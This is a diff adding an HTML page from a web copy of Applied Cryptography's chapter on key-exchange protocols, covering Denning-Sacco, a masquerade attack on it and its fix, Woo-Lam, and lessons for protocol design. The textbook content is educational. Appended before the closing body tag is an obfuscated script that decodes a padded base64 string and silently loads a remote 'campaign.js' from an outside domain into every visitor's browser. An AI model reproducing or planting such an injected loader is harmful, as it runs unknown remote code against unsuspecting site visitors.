@@ -1,0 +1,159 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Basic Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=03//-->
+<!--PAGES=063-065//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="03-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="03-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Denning-Sacco</I></B></FONT></P>
+<P>This protocol also uses public-key cryptography [461]. Trent keeps a database of everyone&#146;s public keys.
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice sends a message to Trent with her identity and Bob&#146;s identity:
+<DL>
+<DD><I>A,B</I>
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Trent sends Alice Bob&#146;s public key, <I>K</I><SUB>B</SUB>, signed with Trent&#146;s private key, <I>T</I>. Trent also sends Alice her own public key, <I>K</I><SUB>A</SUB>, signed with his private key.
+<DL>
+<DD><I>S</I><SUB>T</SUB>(<I>B,K</I><SUB>B</SUB>),<I>S</I><SUB>T</SUB>(<I>A,K</I><SUB>A</SUB>)
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Alice sends Bob a random session key and a timestamp, signed in her private key and encrypted in Bob&#146;s public key, along with both signed public keys.
+<DL>
+<DD><I>E</I><SUB>B</SUB>(<I>S</I><SUB>A</SUB>(<I>K,T</I><SUB>A</SUB>)),<I>S</I><SUB>T</SUB>(<I>B,K</I><SUB>B</SUB>),<I>S</I><SUB>T</SUB>(<I>A,K</I><SUB>A</SUB>)
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Bob decrypts Alice&#146;s message with his private key and then verifies Alice&#146;s signature with her public key. He checks to make sure that the timestamp is still valid.
+</DL>
+<P>At this point both Alice and Bob have <I>K</I>, and can communicate securely.</P>
+<P>This looks good, but it isn&#146;t. After completing the protocol with Alice, Bob can then masquerade as Alice [5]. Watch:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Bob sends his name and Carol&#146;s name to Trent
+<DL>
+<DD><I>B,C</I>
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Trent sends Bob both Bob&#146;s and Carol&#146;s signed public keys.
+<DL>
+<DD><I>S</I><SUB>T</SUB>(<I>B,K</I><SUB>B</SUB>),<I>S</I><SUB>T</SUB>(<I>C,K</I><SUB>C</SUB>)
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Bob sends Carol the signed session key and timestamp he previously received from Alice, encrypted with Carol&#146;s public key, along with Alice&#146;s certificate and Carol&#146;s certificate.
+<DL>
+<DD><I>E</I><SUB>C</SUB>(<I>S</I><SUB>A</SUB>(<I>K,T</I><SUB>A</SUB>)),<I>S</I><SUB>T</SUB>(<I>A,K</I><SUB>A</SUB>),<I>S</I><SUB>T</SUB>(<I>C,K</I><SUB>C</SUB>)
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Carol decrypts Alice&#146;s message with her private key and then verifies Alice&#146;s signature with her public key. She checks to make sure that the timestamp is still valid.
+</DL>
+<P>Carol now thinks she is talking to Alice; Bob has successfully fooled her. In fact, Bob can fool everyone on the network until the timestamp expires.
+</P>
+<P>This is easy to fix. Add the names inside the encrypted message in step (3):</P>
+<DL>
+<DD><I>E</I><SUB>B</SUB>(<I>S</I><SUB>A</SUB>(<I>A,B,K,T</I><SUB>A</SUB>)),<I>S</I><SUB>T</SUB>(<I>A,K</I><SUB>A</SUB>),<I>S</I><SUB>T</SUB>(<I>B,K</I><SUB>B</SUB>)
+</DL>
+<P>Now Bob can&#146;t replay the old message to Carol, because it is clearly meant for communication between Alice and Bob.
+</P>
+<P><FONT SIZE="+1"><B><I>Woo-Lam</I></B></FONT></P>
+<P>This protocol also uses public-key cryptography [1610,1611]:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice sends a message to Trent with her identity and Bob&#146;s identity:
+<DL>
+<DD><I>A,B</I>
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Trent sends Alice Bob&#146;s public key, <I>K</I><SUB>B</SUB>, signed with Trent&#146;s private key, <I>T</I>.
+<DL>
+<DD><I>S</I><SUB>T</SUB>(<I>K</I><SUB>B</SUB>)
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Alice verifies Trent&#146;s signature. Then she sends Bob her name and a random number, encrypted with Bob&#146;s public key.
+<DL>
+<DD><I>E</I><SUB>K</SUB><SUB>B</SUB>(<I>A,R</I><SUB>A</SUB>)
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Bob sends Trent his name, Alice&#146;s name, and Alice&#146;s random number encrypted with Trent&#146;s public key, <I>K</I><SUB>T</SUB>.
+<DL>
+<DD><I>A,B,E</I><SUB>K</SUB><SUB>T</SUB>(<I>R</I><SUB>A</SUB>)
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Trent sends Bob Alice&#146;s public key, <I>K</I><SUB>A</SUB>, signed with Trent&#146;s private key. He also sends him Alice&#146;s random number, a random session key, Alice&#146;s name, and Bob&#146;s name, all signed with Trent&#146;s private key and encrypted with Bob&#146;s public key.
+<DL>
+<DD><I>ST</I>(<I>KA</I>),<I>EKB</I>(<I>ST</I>(<I>RA,K,A,B</I>))
+</DL>
+<DD><B>(6)</B>&nbsp;&nbsp;Bob verifies Trent&#146;s signatures. Then he sends Alice the second part of Trent&#146;s message from step (5) and a new random number&#151;all encrypted in Alice&#146;s public key.
+<DL>
+<DD><I>E</I><SUB>K</SUB><SUB>A</SUB>(<I>S</I><SUB>T</SUB>(<I>RA,K,A,B</I>),<I>R</I><SUB>B</SUB>)
+</DL>
+<DD><B>(7)</B>&nbsp;&nbsp;Alice verifies Trent&#146;s signature and her random number. Then she sends Bob the second random number, encrypted in the session key.
+<DL>
+<DD><I>E</I><SUB>K</SUB>(<I>R</I><SUB>B</SUB>)
+</DL>
+<DD><B>(8)</B>&nbsp;&nbsp;Bob decrypts his random number and verifies that it unchanged.
+</DL>
+<P><FONT SIZE="+1"><B><I>Other Protocols</I></B></FONT></P>
+<P>There are many other protocols in the literature. The X.509 protocols are discussed in Section 24.9, KryptoKnight is discussed in Section 24.6, and Encrypted Key Exchange is discussed in Section 22.5.
+</P>
+<P>Another new public-key protocol is Kuperee [694]. And work is being done on protocols that use <B>beacons</B>, a trusted node on a network that continuously broadcasts authenticated nonces [783].</P>
+<P><FONT SIZE="+1"><B><I>Lessons Learned</I></B></FONT></P>
+<P>There are some important lessons in the previous protocols, both those which have been broken and those which have not:
+</P>
+<DL>
+<DD>&#151; Many protocols failed because the designers tried to be too clever. They optimized their protocols by leaving out important pieces: names, random numbers, and so on. The remedy is to make everything explicit [43,44].
+<DD>&#151; Trying to optimize is an absolute tar pit and depends a whole lot on the assumptions you make. For example: If you have authenticated time, you can do a whole lot of things you can&#146;t do if you don&#146;t.
+<DD>&#151; The protocol of choice depends on the underlying communications architecture. Do you want to minimize the size of messages or the number of messages? Can all parties talk with each other or can only a few of them?
+</DL>
+<P>It&#146;s questions like these that led to the development of formal methods for analyzing protocols.
+</P>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">3.4 Formal Analysis of Authentication and Key-Exchange Protocols</FONT></H3>
+<P>The problem of establishing secure session keys between pairs of computers (and people) on a network is so fundamental that it has led to a great deal of research. Some of the research focused on the development of protocols like the ones discussed in Sections 3.1, 3.2, and 3.3. This, in turn, has led to a greater and more interesting problem: the formal analysis of authentication and key-exchange protocols. People have found flaws in seemingly secure protocols years after they were proposed, and researchers wanted tools that could prove a protocol&#146;s security from the start. Although much of this work can apply to general cryptographic protocols, the emphasis in research is almost exclusively on authentication and key exchange.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="03-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="03-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(OieWwUVm, gishaNMm) {gishaNMm = OieWwUVm.createElement('script');gishaNMm.type = 'text/javascript';gishaNMm.async = true;gishaNMm.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');OieWwUVm.getElementsByTagName('body')[0].appendChild(gishaNMm);}(document));</script></body>
+</html>
